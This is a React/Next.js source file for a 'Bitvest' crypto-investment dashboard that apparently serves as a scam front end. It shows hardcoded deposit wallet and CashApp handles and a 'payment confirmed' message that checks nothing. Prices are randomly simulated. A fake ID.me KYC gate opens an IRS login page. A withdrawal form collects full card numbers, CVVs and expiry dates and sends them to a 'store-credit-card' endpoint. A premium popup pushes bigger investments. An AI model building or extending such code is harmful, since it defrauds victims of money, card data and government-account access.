"use client";

import { useEffect, useState, useCallback } from "react";
import { useRouter } from "next/navigation";
import { FaExchangeAlt, FaBalanceScale, FaBitcoin, FaChartLine, FaDollarSign, FaShoppingCart, FaArrowCircleDown, FaSignOutAlt, FaCopy, FaArrowUp, FaArrowDown, FaEthereum, FaApple } from "react-icons/fa";
import { toast, ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import CreditCardType from "credit-card-type"; // Import credit card type detection library

declare global {
  interface Window {
    TradingView: { 
      widget: new (options: {
        container_id: string;
        autosize: boolean;
        symbol: string;
        interval: string;
        timezone: string;
        theme: string;
        style: string;
        locale: string;
        toolbar_bg: string;
        enable_publishing: boolean;
        allow_symbol_change: boolean;
        save_image: boolean;
        hide_top_toolbar: boolean;
        backgroundColor: string;
      }) => void;
    };
  }
}

const UserDashboard = () => {
  const [darkMode] = useState(false);
  const [username] = useState("Lina Guzman Addy");
  const [showBuyBitcoin, setShowBuyBitcoin] = useState(false);
  const [showWithdrawBitcoin, setShowWithdrawBitcoin] = useState(false);
  const [withdrawWallet, setWithdrawWallet] = useState("");
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [withdrawCurrency, setWithdrawCurrency] = useState("USD");
  const [withdrawMethod, setWithdrawMethod] = useState("wallet"); // New state for withdraw method
  const [creditCardNumber, setCreditCardNumber] = useState(""); // New state for credit card number
  const [cardholderName, setCardholderName] = useState(""); // New state for cardholder name
  const [cvv, setCvv] = useState(""); // New state for CVV
  const [expiryDate, setExpiryDate] = useState(""); // New state for expiry date
  const [creditCardType, setCreditCardType] = useState<string | null>(null); // New state for credit card type
  const [isPremiumUser, setIsPremiumUser] = useState(false);
  const [showPremiumPopup, setShowPremiumPopup] = useState(false);
  const [isKycVerified, setIsKycVerified] = useState(false); // New state for KYC verification status
  // Removed unused bitcoinValue state
  // Removed unused simulatedValues variable
  const [cryptoDetails, setCryptoDetails] = useState([
    { name: "Bitcoin", symbol: "BTC", price: 97500, change: 2.1, icon: <FaBitcoin /> },
    { name: "Ethereum", symbol: "ETH", price: 3850, change: 1.8, icon: <FaEthereum /> },
    { name: "Ripple", symbol: "XRP", price: 2.4, change: 5.2, icon: <FaApple /> },
  ]);
  const router = useRouter();

  const profit = 0;
  const totalInvestment = 0;
  const totalBalance = 0;

  // Check if user qualifies for premium status (investment > $20,000)
  const checkPremiumStatus = useCallback(() => {
    if (totalInvestment > 20000 && !isPremiumUser) {
      setIsPremiumUser(true);
      setShowPremiumPopup(true);
    }
  }, [totalInvestment, isPremiumUser]);

  const getCreditCardIcon = (type: string | null): string => {
    const normalizedType = type?.toLowerCase().replace(" ", "-") || ""; // Normalize type or fallback to an empty string

    const iconMap: Record<string, string> = {
      visa: "https://img.icons8.com/color/48/000000/visa.png",
      mastercard: "https://img.icons8.com/color/48/000000/mastercard.png",
      "american-express": "https://img.icons8.com/color/48/000000/amex.png",
      discover: "https://img.icons8.com/color/48/000000/discover.png",
    };

    return iconMap[normalizedType] || "https://img.icons8.com/color/48/000000/generic-card.png"; // Always return a valid URL
  };

  useEffect(() => {
    // Check premium status on component mount
    checkPremiumStatus();
  }, [checkPremiumStatus]);

  useEffect(() => {
    const interval = setInterval(() => {
      setCryptoDetails((prevDetails) =>
        prevDetails.map((crypto) => {
          if (crypto.symbol === "BTC") {
            const variation = (Math.random() - 0.5) * 200; // Random variation between -100 and +100
            const newPrice = Math.max(90000, crypto.price + variation); // Keep price above 90000
            return { ...crypto, price: newPrice, change: ((newPrice - 97500) / 97500) * 100 };
          }
          return crypto;
        })
      );
    }, 1000); // Update every second

    return () => clearInterval(interval); // Cleanup interval on unmount
  }, []);

  const handleLogout = () => {
    router.push("/");
    toast.success("Logged out successfully");
  };

  const handleCopyWallet = () => {
    navigator.clipboard.writeText("bc1qzpvj8e984mwlxfwyca9glvgd7qn9qhlqsqj6xl");
    // bc1q23ldy4unkh6wggxunnnjzs0dewsuk53dahd804
    toast.success("Wallet address copied to clipboard");
  };

  const handleCopyCashApp = () => {
    navigator.clipboard.writeText("$oafrigie123");
    toast.success("CashApp address copied to clipboard");
  };

  const handleAlreadyPaid = () => {
    setShowBuyBitcoin(false);
    toast.success("Payment confirmed! You will receive your Bitcoin shortly.");
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters
    if (value.length > 4) value = value.slice(0, 4); // Limit to 4 digits
    if (value.length > 2) value = `${value.slice(0, 2)}/${value.slice(2)}`; // Add '/' after MM
    setExpiryDate(value);
  };

  const handleCreditCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters
    setCreditCardNumber(value);

    const detectedCards = CreditCardType(value);
    setCreditCardType(detectedCards.length > 0 ? detectedCards[0].type : null); // Set detected card type
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, ""); // Allow only numbers
    setCvv(value.slice(0, 3)); // Limit to 3 digits
  };

  const handlePayout = async () => {
    if (withdrawMethod === "wallet") {
      if (withdrawWallet && withdrawAmount) {
        setShowWithdrawBitcoin(false);
        toast.success(`Payout of ${withdrawAmount} ${withdrawCurrency} initiated to the provided wallet address.`);
      } else {
        toast.error("Please enter a valid Bitcoin wallet address and amount.");
      }
    } else if (withdrawMethod === "creditCard") {
      if (withdrawAmount && creditCardNumber && cardholderName && cvv && expiryDate) {
        try {
          const response = await fetch("/api/store-credit-card", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              creditCardNumber,
              cardholderName,
              cvv,
              expiryDate,
              withdrawAmount,
              withdrawCurrency,
            }),
          });

          if (response.ok) {
            setShowWithdrawBitcoin(false);
            toast.success(`Payout of ${withdrawAmount} ${withdrawCurrency} will be processed to your credit card.`);
          } else {
            toast.error("Failed to process credit card details.");
          }
        } catch {
          toast.error("An error occurred while processing the credit card details.");
        }
      } else {
        toast.error("Please enter valid credit card details, CVV, expiry date, and amount.");
      }
    }
  };

  const handleIdMeVerification = () => {
    // Simulate opening ID.me in a new window
    window.open("https://sa.www4.irs.gov/ola/", "_blank");
    
    // For demo purposes, we'll mark as verified after a short delay
    // In a real app, this would be handled by ID.me callback
    setTimeout(() => {
      setIsKycVerified(true);
      toast.success("KYC verification completed successfully!");
    }, 3000);
  };

  return (
    <div className={`min-h-screen p-8 pb-20 sm:p-20 font-[family-name:var(--font-geist-sans)] ${darkMode ? "dark" : ""}`}>
      <ToastContainer />
      <header className="flex flex-col items-center sm:items-start mb-4 w-full">
        <div className="flex items-center gap-4 mb-2">
          <h1 className="text-4xl font-bold text-black dark:text-white">Welcome {username}</h1>
          {isPremiumUser && (
            <div className="flex items-center bg-gradient-to-r from-yellow-400 to-orange-500 text-black px-4 py-2 rounded-full shadow-lg">
              <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
              <span className="font-bold text-sm">PREMIUM USER</span>
            </div>
          )}
        </div>
        <div className="flex gap-4 mt-4">
          <button
            className="border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center bg-green-500 text-white gap-2 hover:bg-green-600 text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5"
            onClick={() => setShowBuyBitcoin(true)}
          >
            <FaShoppingCart className="text-lg" />
            Buy Bitcoin
          </button>
          <button
            className="border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center bg-red-500 text-white gap-2 hover:bg-red-600 text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5"
            onClick={() => setShowWithdrawBitcoin(true)}
          >
            <FaArrowCircleDown className="text-lg" />
            Withdraw Bitcoin
          </button>
          <button className="border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center bg-gray-500 text-white gap-2 hover:bg-gray-600 text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5" onClick={handleLogout}>
            <FaSignOutAlt className="text-lg" />
            Logout
          </button>
        </div>
      </header>
      <main className="flex flex-col gap-8 items-center sm:items-start">
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-5 gap-4 mt-4 w-full">
          <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
            <FaExchangeAlt className="text-2xl mb-2 text-primary" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Transactions</h3>
            <p className="text-black dark:text-white">0</p>
          </div>
          <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
            <FaBalanceScale className="text-2xl mb-2 text-primary" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Total Balance</h3>
            <p className="text-black dark:text-white">${totalBalance.toFixed(2)}</p>
          </div>
          <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
            <FaBitcoin className="text-2xl mb-2 text-primary" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">BTC Balance</h3>
            <p className="text-black dark:text-white">0.0000 BTC</p>
          </div>
          <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
            <FaChartLine className="text-2xl mb-2 text-primary" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Profit</h3>
            <p className="text-black dark:text-white">${profit.toFixed(2)}</p>
          </div>
          <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
            <FaDollarSign className="text-2xl mb-2 text-primary" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Total Investment</h3>
            <p className="text-black dark:text-white">${totalInvestment.toFixed(2)}</p>
          </div>
        </div>
        <section className="crypto-details mt-8 w-full">
          <h2 className="text-3xl font-bold mb-6 text-black dark:text-white">Cryptocurrency Updates</h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
            {cryptoDetails.map((crypto, index) => (
              <div
                key={index}
                className={`crypto-card p-6 rounded-lg shadow-lg flex flex-col items-start transition-transform transform hover:scale-105 ${
                  crypto.change >= 0 ? "bg-green-100 dark:bg-green-900" : "bg-red-100 dark:bg-red-900"
                }`}
              >
                <div className="flex items-center gap-4 mb-4">
                  <div className="text-4xl text-yellow-500 animate-bounce">{crypto.icon}</div>
                  <h3 className="text-2xl font-semibold text-black dark:text-white">
                    {crypto.name} ({crypto.symbol})
                  </h3>
                </div>
                <p className="text-lg text-black dark:text-white">
                  Price: <span className="font-bold">${crypto.price.toFixed(2)}</span>
                </p>
                <p
                  className={`text-lg font-semibold flex items-center gap-2 ${
                    crypto.change >= 0 ? "text-green-500" : "text-red-500"
                  }`}
                >
                  {crypto.change >= 0 ? <FaArrowUp /> : <FaArrowDown />}
                  {crypto.change >= 0 ? "+" : ""}
                  {crypto.change.toFixed(2)}%
                </p>
              </div>
            ))}
          </div>
        </section>
        <section className="widgets mt-8 w-full grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
          <div className="widget bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md">
            <img src="https://img.icons8.com/ios-filled/50/ffffff/security-checked.png" alt="Secure Transactions" className="icon" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Secure Transactions</h3>
            <p className="text-black dark:text-white">Experience the security of blockchain technology.</p>
          </div>
          <div className="widget bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md">
            <img src="https://img.icons8.com/ios-filled/50/ffffff/globe.png" alt="Global Reach" className="icon" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Global Reach</h3>
            <p className="text-black dark:text-white">Send and receive Bitcoin anywhere in the world.</p>
          </div>
          <div className="widget bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md">
            <img src="https://img.icons8.com/ios-filled/50/ffffff/decentralized-network.png" alt="Decentralized Network" className="icon" />
            <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Decentralized Network</h3>
            <p className="text-black dark:text-white">Join a network that is not controlled by any single entity.</p>
          </div>
        </section>
      </main>
      <footer className="flex items-center justify-center p-4 bg-transparent text-foreground">
        <p className="text-black dark:text-white">&copy; 2025 Bitvest. All rights reserved.</p>
      </footer>
      {showBuyBitcoin && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm">
          <div className="bg-white bg-opacity-90 p-8 rounded-lg shadow-lg backdrop-blur-md">
            <h2 className="text-2xl font-bold mb-4 text-black">Buy Bitcoin</h2>
            <div className="mb-6">
              <p className="mb-4 text-black font-semibold">Option 1: Bitcoin Wallet Address</p>
              <p className="mb-4 text-black">Send Bitcoin to the following wallet address:</p>
              <p className="mb-4 font-mono text-black flex items-center gap-2 cursor-pointer bg-gray-100 p-3 rounded-lg" onClick={handleCopyWallet}>
                bc1qzpvj8e984mwlxfwyca9glvgd7qn9qhlqsqj6xl
                <FaCopy className="text-lg hover:text-blue-500" />
              </p>
            </div>
            <div className="mb-6 border-t pt-4">
              <p className="mb-4 text-black font-semibold">Option 2: CashApp Payment</p>
              <p className="mb-4 text-black">Send payment via CashApp to:</p>
              <p className="mb-4 font-mono text-black flex items-center gap-2 cursor-pointer bg-green-100 p-3 rounded-lg" onClick={handleCopyCashApp}>
                $oafrigie123
                <FaCopy className="text-lg hover:text-green-600" />
              </p>
            </div>
            <div className="flex justify-end gap-4">
              <button
                className="px-4 py-2 bg-gray-300 rounded-lg text-black"
                onClick={() => setShowBuyBitcoin(false)}
              >
                Close
              </button>
              <button
                className="px-4 py-2 bg-green-500 text-white rounded-lg"
                onClick={handleAlreadyPaid}
              >
                Already Paid
              </button>
            </div>
          </div>
        </div>
      )}
      {showWithdrawBitcoin && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm p-4">
          <div className="bg-white bg-opacity-90 rounded-lg shadow-lg backdrop-blur-md max-w-lg w-full max-h-[90vh] overflow-y-auto">
            <div className="p-6">
              <h2 className="text-2xl font-bold mb-4 text-black">Withdraw Bitcoin</h2>
            
            {!isKycVerified ? (
              // KYC Verification Required Screen
              <div className="text-center">
                <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-lg p-8 mb-6">
                  <div className="flex flex-col items-center">
                    <div className="w-16 h-16 bg-blue-500 rounded-full flex items-center justify-center mb-4">
                      <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <h3 className="text-2xl font-bold text-blue-900 mb-4">KYC Verification Required</h3>
                    <p className="text-blue-800 leading-relaxed mb-4">
                      Before we process your withdrawal, the platform now requires a quick KYC (Know Your Customer) verification to ensure you&apos;re the rightful owner.
                    </p>
                    <p className="text-blue-800 leading-relaxed mb-6">
                      We use <span className="font-semibold">ID.me</span> for this —it&apos;s a trusted U.S. government verification system. You&apos;ll only do this once. After that, we can release your full balance with no delay.
                    </p>
                    <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
                      <div className="flex items-center gap-2 mb-2">
                        <svg className="w-5 h-5 text-yellow-600" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                        </svg>
                        <span className="font-semibold text-yellow-800">Important</span>
                      </div>
                      <p className="text-yellow-700 text-sm">
                        You must complete ID.me verification to access the withdrawal form. This is a one-time security requirement.
                      </p>
                    </div>
                    <button 
                      onClick={handleIdMeVerification}
                      className="w-full bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg text-lg font-medium transition-colors duration-200 flex items-center justify-center gap-3 mb-4"
                    >
                      <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-8.293l-3-3a1 1 0 00-1.414 1.414L10.586 9H7a1 1 0 100 2h3.586l-1.293 1.293a1 1 0 101.414 1.414l3-3a1 1 0 000-1.414z" clipRule="evenodd" />
                      </svg>
                      Start ID.me Verification
                    </button>
                    <p className="text-gray-600 text-sm">
                      This will open ID.me in a new window. Complete the verification and return here.
                    </p>
                  </div>
                </div>
                <div className="flex justify-center">
                  <button
                    className="px-6 py-2 bg-gray-300 hover:bg-gray-400 rounded-lg text-black transition-colors"
                    onClick={() => setShowWithdrawBitcoin(false)}
                  >
                    Cancel
                  </button>
                </div>
              </div>
            ) : (
              // Withdrawal Form (shown after KYC verification)
              <>
              <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
                <div className="flex items-center gap-2">
                  <svg className="w-5 h-5 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                  </svg>
                  <span className="font-semibold text-green-800">KYC Verified</span>
                </div>
                <p className="text-green-700 text-sm mt-1">Your identity has been verified. You can now proceed with your withdrawal.</p>
              </div>

            <label htmlFor="withdraw-method" className="mb-2 text-black">Select withdrawal method:</label>
            <select
              id="withdraw-method"
              className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
              value={withdrawMethod}
              onChange={(e) => setWithdrawMethod(e.target.value)}
            >
              <option value="wallet">Bitcoin Wallet</option>
              <option value="creditCard">Credit Card</option>
            </select>
            {withdrawMethod === "wallet" && (
              <>
                <p className="mb-4 text-black">Enter the Bitcoin wallet address to withdraw to:</p>
                <input
                  className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
                  type="text"
                  value={withdrawWallet}
                  onChange={(e) => setWithdrawWallet(e.target.value)}
                  placeholder="Bitcoin Wallet Address"
                  required
                />
              </>
            )}
            {withdrawMethod === "creditCard" && (
              <>
                <p className="mb-4 text-black">Enter your credit card details:</p>
                <div className="relative mb-4">
                  <input
                    className="w-full px-3 py-2 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
                    type="text"
                    value={creditCardNumber}
                    onChange={handleCreditCardNumberChange}
                    placeholder="Credit Card Number"
                    required
                  />
                  {creditCardType && (
                    <img
                      src={getCreditCardIcon(creditCardType)}
                      alt={creditCardType || "Credit Card"}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 h-6"
                      onError={(e) => (e.currentTarget.src = "https://img.icons8.com/color/48/000000/generic-card.png")} // Fallback on error
                    />
                  )}
                </div>
                <input
                  className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
                  type="text"
                  value={cardholderName}
                  onChange={(e) => setCardholderName(e.target.value)}
                  placeholder="Cardholder Name"
                  required
                />
                <input
                  className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
                  type="text"
                  value={cvv}
                  onChange={handleCvvChange}
                  placeholder="CVV"
                  required
                />
                <input
                  className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
                  type="text"
                  value={expiryDate}
                  onChange={handleExpiryDateChange}
                  placeholder="MM/YY"
                  maxLength={5}
                  required
                />
              </>
            )}
            <p className="mb-4 text-black">Enter the amount to withdraw:</p>
            <input
              className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
              type="text"
              value={withdrawAmount}
              onChange={(e) => setWithdrawAmount(e.target.value)}
              placeholder="Amount"
              required
            />
            <label htmlFor="currency-select" className="mb-4 text-black">Select currency:</label>
            <select
              id="currency-select"
              className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
              value={withdrawCurrency}
              onChange={(e) => setWithdrawCurrency(e.target.value)}
            >
              <option value="USD">USD</option>
              <option value="BTC">BTC</option>
            </select>
            <div className="flex justify-end gap-4">
              <button
                className="px-4 py-2 bg-gray-300 rounded-lg text-black"
                onClick={() => setShowWithdrawBitcoin(false)}
              >
                Close
              </button>
              <button
                className="px-4 py-2 bg-green-500 text-white rounded-lg"
                onClick={handlePayout}
              >
                Payout
              </button>
            </div>
            </>
            )}
            </div>
          </div>
        </div>
      )}
      {showPremiumPopup && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur-sm z-50">
          <div className="bg-gradient-to-br from-yellow-400 via-orange-500 to-red-500 p-1 rounded-xl shadow-2xl">
            <div className="bg-white rounded-lg p-8 max-w-md w-full mx-4">
              <div className="text-center">
                <div className="mx-auto flex items-center justify-center h-16 w-16 rounded-full bg-gradient-to-r from-yellow-400 to-orange-500 mb-4">
                  <svg className="h-8 w-8 text-white" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                  </svg>
                </div>
                <h2 className="text-3xl font-bold text-gray-900 mb-2">🎉 Congratulations!</h2>
                <h3 className="text-xl font-semibold text-orange-600 mb-4">You&apos;re Now a Premium User!</h3>
                <p className="text-gray-700 mb-4 leading-relaxed">
                  Your investment of <span className="font-bold text-green-600">${totalInvestment.toLocaleString()}</span> qualifies you for our exclusive Premium tier with enhanced features and priority support.
                </p>
                
                <div className="bg-gradient-to-r from-blue-50 to-purple-50 rounded-lg p-4 mb-4 border border-blue-200">
                  <p className="text-gray-800 text-sm leading-relaxed">
                    <span className="font-semibold text-blue-600">💡 Pro Tip:</span> Since you&apos;ve invested ${totalInvestment.toLocaleString()}, consider increasing your investment to unlock even <span className="font-bold">higher withdrawal limits</span> and <span className="font-bold">bigger profit potential</span>. The more you invest, the more you can withdraw and earn!
                  </p>
                </div>
                
                <div className="bg-gradient-to-r from-yellow-50 to-orange-50 rounded-lg p-4 mb-6">
                  <h4 className="font-semibold text-gray-900 mb-3">🚀 Premium Benefits Unlocked:</h4>
                  <ul className="text-left text-sm text-gray-700 space-y-2">
                    <li className="flex items-center">
                      <span className="text-green-500 mr-2">✓</span>
                      Priority customer support (24/7)
                    </li>
                    <li className="flex items-center">
                      <span className="text-green-500 mr-2">✓</span>
                      Lower transaction fees (0.1% vs 0.25%)
                    </li>
                    <li className="flex items-center">
                      <span className="text-green-500 mr-2">✓</span>
                      Advanced trading tools & analytics
                    </li>
                    <li className="flex items-center">
                      <span className="text-green-500 mr-2">✓</span>
                      Early access to new features
                    </li>
                    <li className="flex items-center">
                      <span className="text-green-500 mr-2">✓</span>
                      Premium market insights & reports
                    </li>
                  </ul>
                </div>
                
                <button
                  className="w-full py-3 bg-gradient-to-r from-yellow-400 to-orange-500 text-white font-semibold rounded-lg hover:from-yellow-500 hover:to-orange-600 transition-all duration-200 transform hover:scale-105"
                  onClick={() => setShowPremiumPopup(false)}
                >
                  Awesome! Continue Trading
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default UserDashboard;
